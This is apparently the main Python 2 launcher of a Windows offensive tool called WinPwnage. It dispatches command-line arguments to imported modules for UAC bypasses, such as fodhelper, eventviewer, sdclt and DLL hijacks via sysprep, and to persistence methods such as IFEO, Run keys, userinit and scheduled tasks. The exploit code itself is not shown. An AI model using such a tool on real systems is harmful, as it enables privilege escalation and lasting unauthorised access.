import sys
from core.prints import *
from core.scanner import *
from core.runas import *
from functions.uac_slui import *
from functions.uac_perfmon import *
from functions.uac_fodhelper import *
from functions.uac_eventviewer import *
from functions.uac_sdcltcontrol import *
from functions.uac_silentcleanup import *
from functions.uac_compmgmtlauncher import *
from functions.uac_computerdefaults import *
from functions.uac_sdcltisolatedcommand import *
from functions.uac_dll_sysprep import *
from functions.uac_dll_cliconfg import *
from functions.uac_dll_mcx2prov import *
from functions.uac_dll_migwiz import *
from functions.persist_dll_explorer import *
from functions.persist_schtask import *
from functions.persist_ifeo import *
from functions.persist_hklm_run import *
from functions.persist_hkcu_run import *
from functions.persist_userinit import *

print """
        _                               
  _ _ _|_|___ ___ _ _ _ ___ ___ ___ ___ 
 | | | | |   | . | | | |   | .'| . | -_|
 |_____|_|_|_|  _|_____|_|_|__,|_  |___|
             |_|               |___|

 Usage:
   * winpwnage.py -scan
   * winpwnage.py -use <function> <payload>
   * winpwnage.py -runas <payload>
 """

def main():
	try:
		if (sys.argv[1] == "-scan"):
			scan()
		elif (sys.argv[1] == "-runas"):
			runas(sys.argv[2])
		elif (sys.argv[1] == "-use"):
			if (sys.argv[2] == "slui"):
				slui(sys.argv[3])
			elif (sys.argv[2] == "perfmon"):
				perfmon(sys.argv[3])
			elif (sys.argv[2] == "fodhelper"):
				fodhelper(sys.argv[3])
			elif (sys.argv[2] == "eventviewer"):
				eventvwr(sys.argv[3])
			elif (sys.argv[2] == "sdcltcontrol"):
				sdclt_control(sys.argv[3])
			elif (sys.argv[2] == "compmgmtlauncher"):
				compmgmtlauncher(sys.argv[3])
			elif (sys.argv[2] == "computerdefaults"):
				computerdefaults(sys.argv[3])				
			elif (sys.argv[2] == "sdcltisolatedcommand"):
				sdclt_isolatedcommand(sys.argv[3])
			elif (sys.argv[2] == "silentcleanup"):
				silentcleanup(sys.argv[3])
			elif (sys.argv[2] == "sysprep"):
				sysprep(sys.argv[3])
			elif (sys.argv[2] == "cliconfg"):
				cliconfg(sys.argv[3])
			elif (sys.argv[2] == "mcx2prov"):
				mcx2prov(sys.argv[3])
			elif (sys.argv[2] == "migwiz"):
				migwiz(sys.argv[3])
			elif (sys.argv[2] == "explorer"):
				fax_dll(sys.argv[3])
			elif (sys.argv[2] == "schtask"):
				schtask(sys.argv[3])
			elif (sys.argv[2] == "ifeo"):
				ifeo(sys.argv[3],sys.argv[4])
			elif (sys.argv[2] == "ifeo_delete"):
				ifeo_delete(sys.argv[3])
			elif (sys.argv[2] == "hklm_run"):
				hklm_run(sys.argv[3])
			elif (sys.argv[2] == "hklm_run_delete"):
				hklm_run_delete()
			elif (sys.argv[2] == "hkcu_run"):
				hkcu_run(sys.argv[3])
			elif (sys.argv[2] == "hkcu_run_delete"):
				hkcu_run_delete()
			elif (sys.argv[2] == "userinit"):
				userinit(sys.argv[3])
			elif (sys.argv[2] == "userinit_delete"):
				userinit_delete()
	except Exception as error:
		print_info("Unrecognized command")

if __name__ == "__main__":
	main()
